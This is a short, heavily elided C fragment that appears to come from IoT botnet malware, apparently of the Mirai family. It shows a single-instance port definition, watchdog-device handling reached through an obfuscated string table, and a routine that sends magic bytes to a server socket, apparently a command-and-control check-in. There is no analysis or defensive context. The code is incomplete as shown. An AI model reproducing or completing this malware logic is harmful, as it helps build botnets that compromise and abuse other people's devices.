...
#define SINGLE_INSTANCE_PORT 10345
...
void watchdog_maintain(void)
{
    ...
    if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_DOG, NULL), 2)) != -1 ||
        ...
        if(pending_connection)
        {
            ...
            else
            {
                ...
                else
                {
                    ...
                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x33\x66\x99\x05", 4, MSG_NOSIGNAL);
